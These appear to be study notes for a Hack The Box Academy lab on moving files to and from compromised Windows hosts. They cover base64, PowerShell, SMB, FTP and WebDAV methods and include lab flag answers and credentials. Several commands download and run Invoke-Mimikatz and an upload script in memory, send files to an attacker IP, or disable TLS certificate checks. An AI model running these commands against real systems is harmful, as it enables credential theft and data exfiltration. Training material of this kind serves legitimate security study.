# Windows File Transfer Methods
## PowerShell Base64 Encode & Decode
If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. We can use `md5sum` to calculate and verifie 128-bit MD5 checksums for integrity check.
1. **Check MD5Hash of file to transfer**
    ```
    $ md5sum id_rsa

    4e301756a07ded0a2dd6953abf015278  id_rsa
    ```
2. **Encode the file content to Base64**
    ```
    $ cat id_rsa |base64 -w 0;echo

    LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRU...
    ```
3. **Decode the copied file's content in Base64**
   ```
   PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRU...))
   ```
4. **Confirm the MD5 Hashes Match**
   ```
   PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

   Algorithm    Hash                                Path
   ---------    ----                                ----
   MD5          4E301756A07DED0A2DD6953ABF015278    C:\Users\Public\id_rsa
   ```

> **Note:** Windows Command Line utility (cmd.exe) has a maximum string length of **8,191 characters**, so sending extremely large strings may error.

## PowerShell Web Downloads
> [List of Powershell download commands](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

In any version of PowerShell, the `System.Net.WebClient` class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following table describes `WebClient` methods for downloading data from a resource:
|Method|Description|
|-|-|
|`OpenRead`|Returns the data from a resource as a Stream.|
|`OpenReadAsync`|Returns the data from a resource without blocking the calling thread.|
|`DownloadData`|Downloads data from a resource and returns a Byte array.|
|`DownloadDataAsync`|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|`DownloadFile`|Downloads data from a resource to a local file.|
|`DownloadFileAsync`|	Downloads data from a resource to a local file without blocking the calling thread.|
|`DownloadString`|Downloads a String from a resource and returns a String.|
|`DownloadStringAsync`|	Downloads a String from a resource without blocking the calling thread.|

#### File Download
```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### PowerShell DownloadString - Fileless Method
Instead of downloading a PowerShell script to disk, we can run it directly in memory using the `Invoke-Expression` cmdlet or the alias `IEX`.
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest
From PowerShell 3.0 onwards, the `Invoke-WebRequest` cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### Common Errors with PowerShell
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`:
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads
1. **Create the SMB Server**
   ```
   $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

   [*] Config file parsed
   [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
   [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
   [*] Config file parsed
   [*] Config file parsed
   [*] Config file parsed
   ```
2. **Copy a File from the SMB Server**
   ```
   C:\htb> net use n: \\192.168.220.133\share /user:test test

   The command completed successfully.

   C:\htb> copy n:\nc.exe
           1 file(s) copied.
   ```

## FTP Downloads
1. **Installing the FTP Server Python3 Module - pyftpdlib**
   ```
   $ sudo pip3 install pyftpdlib
   ```
2. **Setting up a Python3 FTP Server**
   ```
   $ sudo python3 -m pyftpdlib --port 21

   [I 2022-05-17 10:09:19] concurrency model: async
   [I 2022-05-17 10:09:19] masquerade (NAT) address: None
   [I 2022-05-17 10:09:19] passive ports: None
   [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
   ```
3. **Transferring Files from an FTP Server Using PowerShell**
   ```
   PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
   ```
4. **Create a Command File for the FTP Client and Download the Target File**

    When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
    ```
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous

    ftp> GET file.txt
    ftp> bye

    C:\htb>more file.txt
    This is a test file
    ```

## PowerShell Web Uploads
1. **Installing a Configured WebServer with Upload**
    ```
    $ pip3 install uploadserver

    Collecting upload server
    Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
    Installing collected packages: uploadserver
    Successfully installed uploadserver-2.0.1

    $ python3 -m uploadserver

    File upload available at /upload
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    ```
2. **PowerShell Script to Upload a File to Python Upload Server**
    ```
    PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
    PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

    [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
    [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
    ```
    or **PowerShell Base64 Web Upload**
    ```
    PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
    ```
    We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
    ```
    $ nc -lvnp 8000

    listening on [any] 8000 ...
    connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
    POST / HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
    Content-Type: application/x-www-form-urlencoded
    Host: 192.168.49.128:8000
    Content-Length: 1820
    Connection: Keep-Alive

    IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
    ...SNIP...

    $ echo <base64> | base64 -d -w 0 > hosts
    ```

## SMB Uploads
SMB over HTTP with `WebDav`. `WebDAV` (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. 
1. **Installing WebDav Python modules and run the WebDav Server**
    ```
    $ sudo pip3 install wsgidav cheroot
    $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
    ```
2. **Connecting to the Webdav Share**
    ```
    C:\htb> dir \\192.168.49.128\DavWWWRoot
    ```
    > **Note**: `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The `DavWWWRoot` keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
    >
    > You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder
3. **Uploading Files using SMB**
    ```
    C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
    ```

## FTP Uploads
1. **Start FTP server and allow clients to upload files to our attack host**
    ```
    $ sudo python3 -m pyftpdlib --port 21 --write
    ```
2. **Uploading Files using FTP**
    ```
    PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    ```
    or **Create a Command File for the FTP Client to Upload a File**
    ```
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128

    Log in with USER and PASS first.


    ftp> USER anonymous
    ftp> PUT c:\windows\system32\drivers\etc\hosts
    ftp> bye
    ```

## Questions
1. Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer. **Answer: b1a4ca918282fcd96004565521944a3b**
   - `PS C:\> (New-Object Net.WebClient).DownloadFile('http://10.129.201.55/flag.txt','flag.txt')`: download the file.
   - `PS C:\> more .\flag.txt`: read the content.
2. Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer. **Answer: f458303ea783c224c6b4e7ef7f17eb9d**
   - At host, use RDP to connect to the target: `$ xfreerdp3 /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.201.55`
   - At host, download the file named upload_win.zip and open a python web server at the location containing that file `$ python3 -m http.server`
   - At the target machine, download that file: `PS C:\Users\htb-student> curl http://<host_IP>:8000/upload_win.zip -UseBasicParsing -OutFile upload_win.zip` (use `-UseBasicParsing` to bypass error at **Common Errors with PowerShell**).
   - At the target machine, unzip that file: `PS C:\Users\htb-student> Expand-Archive -Path .\upload_win.zip -DestinationPath upload_win`
   - At the target machine, calculate the hash to get the answer: `PS C:\Users\htb-student> hasher .\upload_win\upload_win.txt`
3. Connect to the target machine via RDP and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished. **Answer: DONE**